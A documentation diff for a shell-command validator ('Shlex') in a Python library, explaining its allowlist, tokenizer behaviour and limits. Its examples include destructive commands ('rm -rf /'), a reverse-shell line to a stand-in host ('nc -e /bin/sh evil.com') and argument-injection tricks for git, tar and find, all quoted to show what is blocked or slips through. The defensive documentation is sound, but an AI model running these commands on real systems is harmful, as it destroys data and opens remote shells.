@@ -656,7 +656,10 @@ constraint.is_safe("not-a-url")  # False
 
 ### Shlex
 
-Validates that a shell command string is safe and simple. Ensures the command is a single executable with literal arguments, preventing shell injection.
+Checks a command string against a binary allowlist and a defined subset of POSIX
+shell syntax. Every SDK uses the same core tokenizer for matching, explanations,
+and attenuation. The check does not execute the command, resolve the executable,
+or identify the resources the program will access.
 
 ```python
 from tenuo import Shlex
@@ -667,10 +670,21 @@ constraint = Shlex(allow=["ls", "cat", "grep"])
 constraint.matches("ls -la /tmp")           # True
 constraint.matches("cat file.txt")          # True
 constraint.matches("ls -la; rm -rf /")      # False (operator blocked)
+constraint.matches('ls "foo; bar"')         # True (quoted semicolon is literal)
+Shlex(allow=["echo"]).matches('echo ";"')    # True (a quoted operator is an argument)
+constraint.matches("ls -la # note")         # True (literal # with no operators)
+constraint.matches("ls #; rm")              # False (# is a word character, so ; is still blocked)
+constraint.matches("ls foo#; rm -rf /")     # False (# inside a word does not hide ;)
+constraint.matches("./ls,evil -la")         # False (the command name is ./ls,evil)
 constraint.matches("echo $(whoami)")        # False (command substitution)
+constraint.matches('echo "$HOME"')          # False ($ expands inside double quotes)
 constraint.matches("ls $HOME")              # False (variable expansion)
 constraint.matches("rm -rf /")              # False (rm not in allowlist)
 ```
+
+`#` is an ordinary word character, never a comment, so an operator after `#` is still rejected. Each `allow` entry matches the command word literally: `allow=["ls"]` matches `ls` only (not `/usr/bin/ls`, `./ls`, or `/tmp/attacker/ls`), and any command word containing `..` is rejected.
+
+A quoted or backslash-escaped operator is a literal argument, so `find . -exec rm {} \;` passes this check. `find` still runs the argument. That is the semantic gap in the warning below. `Shlex.check(command)` returns the same decision the warrant uses, including the reason.
 
 **Security Features:**
 
@@ -687,23 +701,31 @@ constraint.matches("rm -rf /")              # False (rm not in allowlist)
 | Unauthorized binary | `nc -e /bin/sh evil.com` | Yes |
 
 > [!NOTE]
-> Glob characters (`*`, `?`, `[`) are allowed. They expand to filenames
-> but are not shell injection vectors. If you need to restrict file
-> access, combine `Shlex` with `Subpath`.
+> Glob characters (`*`, `?`, `[`) are literal arguments to this check. A
+> shell that runs the command may still expand them. Bash may also expand
+> `{a,b,c}`; this check keeps that as one word. If you need to restrict file
+> access, expose explicit path arguments checked with `Subpath` and execute the
+> checked values through a trusted runner.
 
 > [!WARNING]
-> **Tier 1 Mitigation Only**
+> **Syntax checks and execution**
 >
-> Shlex validates **shell syntax**, not **tool semantics**. Some tools interpret arguments as commands:
+> `Shlex` can be used in local policies and signed warrants. Its guarantee covers
+> command syntax and the command word; each program still interprets its own
+> arguments. Some tools interpret arguments as commands:
 >
 > ```python
 > # These pass Shlex but the tool executes the argument:
 > "git clone --upload-pack='malicious' repo"
 > "tar --checkpoint-action=exec=cmd -xf file.tar"
+> "find . -exec rm {} \\;"
 > ```
 >
-> To authorize what actually runs, use a structured tool and `tenuo.process`
-> (below), which executes the checked arguments without a shell.
+> For tools that execute commands, prefer structured operations with explicit
+> flags, paths, and working directories, authorize those values, and execute
+> them without a shell. Program-specific execution profiles must account for
+> options and configuration that run other programs. Filesystem or process
+> isolation is needed when the program itself must be confined.
 
 > [!NOTE]
 > **Dangerous Binaries**
